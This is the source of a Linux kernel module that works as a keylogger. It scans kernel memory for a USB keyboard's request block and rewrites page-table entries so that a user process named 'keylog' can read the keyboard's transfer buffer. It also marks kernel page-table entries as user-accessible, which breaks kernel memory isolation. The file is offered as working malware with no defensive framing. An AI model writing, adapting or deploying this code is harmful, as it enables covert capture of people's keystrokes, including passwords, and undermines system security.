#include <linux/string.h>
#include <linux/ctype.h>
#include <linux/usb.h>
#include <linux/module.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/pci.h>
#include <linux/mm.h>
#include <linux/kallsyms.h>
#define TARGET		"keylog"
#define WRITE_PAGE	0x40000000
#define SEND_BUFFER	0x50000000

unsigned long _init_level4_pgt;
unsigned long start = PAGE_OFFSET;
unsigned long end = 0xffff880280000000;
unsigned long i;

int is_valid_addr(unsigned long long addr)
{
        pgd_t *pgd;
        pte_t *pte;
        pud_t *pud;
        pmd_t *pmd;

	if( addr < 0xffff880000000000 ) return 0;
 
        pgd = _init_level4_pgt + (pgd_index(addr) * 8);
        if (pgd_none(*pgd) || pgd_bad(*pgd))
                return 0;

        *(unsigned long*)pgd |= _PAGE_USER;
        pud = pud_offset(pgd, addr);
        if (pud_none(*pud) || pud_bad(*pud)){
			if( (pud->pud & PTE_FLAGS_MASK) == 0 ) return 0;
            return 1;
		}

        *(unsigned long*)pud |= _PAGE_USER;
        pmd = pmd_offset(pud, addr);
        if (pmd_none(*pmd) || pmd_bad(*pmd)){
                if( (pmd->pmd & PTE_FLAGS_MASK) == 0 ) return 0;
                return 1;
        }

        *(unsigned long*)pmd |= _PAGE_USER;
        pte = pte_offset_map(pmd, addr);
        if( (pte->pte & PTE_FLAGS_MASK) == 0 ) return 0;
        return 1;
}

int modify_pgt_start( unsigned long _phys, unsigned long addr )
{
	struct task_struct *task;
	unsigned long phys = _phys & 0x000000fffffff000;
	unsigned long pfn, tmp, offset;

	pgd_t *pgd;
	pud_t *pud;
	pmd_t *pmd;
	pte_t *pte;

	for_each_process( task ){
		if( (strcmp( task->comm, TARGET ) == 0 )){	// "target" is user process
			pgd = pgd_offset( task->mm, addr );
			if( pgd_none( *pgd ) || pgd_bad( *pgd ) ){
				printk( "bad pgd\n" );
				return 0;
			}
			pud = pud_offset( pgd, addr );
			if( pud_none( *pud ) || pud_bad( *pud ) ){
				printk( "bad pud\n" );
				return 0;
			}
			pmd = pmd_offset( pud, addr );
			if( pmd_none( *pmd ) || pmd_bad( *pmd ) ){
				printk( "bad pmd\n" );
				return 0;
			}
			pte = pte_offset_map( pmd, addr );
			if( pte_none( *pte ) || (pte->pte & PTE_FLAGS_MASK) == 0 ){
				printk( "bad pte\n" );
				return 0;
			}
			if( addr == WRITE_PAGE ){
				printk( "modify_page_table\n" );
				tmp = pte->pte & 0xffff000000000fff;
				tmp |= phys;
				pte->pte = tmp;
			}
			else if( addr == SEND_BUFFER ){
				printk( "Send buffer from kernel to user\n" );
				tmp = (unsigned long)pte->pte & 0x0000fffffffff000;
				tmp += 0xffff880000000000;
            			*(unsigned long*)tmp = _phys;
			}
		}
	}
	return 0;
}

static int __init search_kbdbuf_start(void)
{
	int len;
	unsigned long i,j;
	char buf[256];

	_init_level4_pgt = kallsyms_lookup_name("init_level4_pgt");
	if( !_init_level4_pgt ){
		printk("init_level4_gpt not found!\n");
		return 0;
	}
	printk( "locating the keyboard buffer\n" );
	for( i = 0; start+i < end; i += 0x10 ){
		if( is_valid_addr(start+i) == 0 ){
			i += 0xff0;
		 	continue;
		}
		struct urb *urbp = (struct urb *)(start+i);
		if( is_valid_addr(&urbp->dev) == 0 ) continue;
		unsigned long long dv = urbp->dev;
		if( is_valid_addr(&urbp->transfer_dma) == 0 ) continue;
		unsigned long long tdma = urbp->transfer_dma;
		if( is_valid_addr(&urbp->transfer_buffer_length) == 0 ) continue;
		int tlen = urbp->transfer_buffer_length;
		if( is_valid_addr(&urbp->transfer_buffer) == 0 ) continue;
		unsigned long long tbuf = urbp->transfer_buffer;
		if( is_valid_addr(&urbp->status) == 0 ) continue;
		int status = urbp->status;

		if( is_valid_addr(dv) ){
			struct usb_device *udp = dv;
			if( dv % 0x400 == 0 ){
			if( tdma % 0x20 == 0 ){
			if( tlen == 8 ){
			if( tbuf != NULL ){
			if( status ){
				if( is_valid_addr(&udp->product) && is_valid_addr(udp->product) ){
					strncpy(buf,udp->product,128);
					len = strlen(buf);
					for( j = 0; j < len; j++ )
						buf[j] = tolower(buf[j]);
					if( strstr(buf,"usb") && strstr(buf,"keyboard") ){
						printk("============================\n");
						printk("addr : %llX\n",start+i);
						printk("dev : %llX\n",dv);
						printk("status : %d\n",status);
						printk("product_addr : %llX\n",udp->product);
						printk("product : %s\n",udp->product);
						printk("manufacturer : %s\n",udp->manufacturer);
						printk("transfer_buffer : %llX\n",urbp->transfer_buffer);
						printk("&transfer_buffer : %llX\n",&urbp->transfer_buffer);
						printk("============================\n");
						modify_pgt_start( urbp->transfer_buffer, WRITE_PAGE );	// modify the pte table
						modify_pgt_start( urbp->transfer_buffer, SEND_BUFFER );	// send buffer from kernel to user
						return 0;
					}
				}
			}
			}
			}
			}
			}
		}
	}
	printk("The End\n");
	return 0;
}

static void __exit search_kbdbuf_end(void)
{
}

module_init(search_kbdbuf_start);
module_exit(search_kbdbuf_end);
MODULE_LICENSE("GPL");
